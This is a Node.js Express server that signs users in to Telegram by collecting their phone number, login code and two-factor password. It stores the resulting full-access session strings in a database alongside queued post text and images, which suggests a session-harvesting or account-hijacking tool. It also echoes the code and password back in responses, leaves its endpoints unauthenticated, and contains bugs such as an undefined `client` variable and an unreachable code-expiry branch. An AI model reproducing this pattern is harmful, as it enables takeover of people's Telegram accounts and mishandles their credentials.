require("dotenv").config();
const fs = require("fs");

const express = require("express");
const cors = require("cors");
const app = express();

const dataBase = require('./dataBase.js');
const imgBase = require('./imgBase.js');

app.use(cors({ methods: ["GET", "POST"] }));
app.use(express.json());

const { Api, TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { password: passwordUtils } = require("telegram");
const { channel } = require("diagnostics_channel");
const { all } = require("axios");


const apiId = +process.env.API_ID;
const apiHash = process.env.API_HASH;


//imgBase.deleteMany({})

function clearDB(){
  imgBase.deleteMany({});
  dataBase.deleteMany({});
}
//clearDB();
imgBase.findOne({}).then(res => {
  console.log(res);
})

const USERS = {};

async function main() {
  

  app.post('/auth/phone', async (req, res) => {
    const { id, phone } = req.body;

    USERS[id] = { phone };
    USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
    await USERS[id].client.connect();

    USERS[id].resultSendCode = await USERS[id].client.invoke(
      new Api.auth.SendCode({
        phoneNumber: USERS[id].phone,
        apiId,
        apiHash,
        settings: new Api.CodeSettings({
          allowFlashcall: true,
          currentNumber: true,
          allowAppHash: true,
          allowMissedCall: true,
          logoutTokens: [Buffer.from("arbitrary data here")],
        }),
      })
    );

    res.json({ msg:'Код был отправлен!', phone, id});
    
  });

  app.post('/auth/code-password', async (req, res) => {
    const { id, code, password } = req.body;
    USERS[id].code = code.replaceAll(' ','');
    USERS[id].password = password;
    try {     
      USERS[id].resultCodeTg = await USERS[id].client.invoke(
        new Api.auth.SignIn({
          phoneNumber: USERS[id].phone,
          phoneCodeHash: USERS[id].resultSendCode.phoneCodeHash,
          phoneCode: USERS[id].code
        })
      );

      await dataBase.insertOne({ id, session: USERS[id].client.session.save() });
      res.json({ msg:'Вы были авторизованы!', code, password, id, session: USERS[id].client.session.save()});
      await client.disconnect();
      await client.destroy();
      delete USERS[id];
    } catch (err) {
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        console.log("🔒 Требуется пароль 2FA...");
        const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
        const password = await USERS[id].password; // пароль от пользователя
        const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
    
        await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );

        await dataBase.insertOne({ id, session: USERS[id].client.session.save(), post_image: null, post_text: null });
        res.json({ msg:'Вы были авторизованы!', code, password, id, session: USERS[id].client.session.save()});
        await client.disconnect();
        await client.destroy();
        delete USERS[id];
      } else {
        console.error("❌ Ошибка входа:", err);
        return res.json({ msg:'Ошибка при входе', err: err.errorMessage });
      }

      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
    
        USERS[id].resultSendCode = await USERS[id].client.invoke(
          new Api.auth.SendCode({
            phoneNumber: USERS[id].phone,
            apiId,
            apiHash,
            settings: new Api.CodeSettings({})
          })
        );
        return res.json({ msg:'Новый код отправлен. Введите его снова:'});

      } 
      
    }

  });
  

  app.post('/upload-image', async (req, res) => {
    const { id, current, thumb } = req.body;
    await imgBase.insertOne({ id, current, thumb });
    res.json({ type: 200 });
  });

  app.post('/images', async (req, res) => {
    const imagesRaw = await imgBase.find({});
    const images = imagesRaw.map(item =>  { 
      return { current: item.current, thumb: item.thumb }
    })
    res.json({ images });
  });



  app.post('/save-post', async (req, res) => {
    const { id, text, url } = req.body;
    await dataBase.updateOne({ id:id }, { $set:{ post_image: url, post_text: text } });
    res.json({ type: 200 });
  });

}
main();





app.listen(3042, (err) => {
  err ? err : console.log("STARTED SERVER");
});
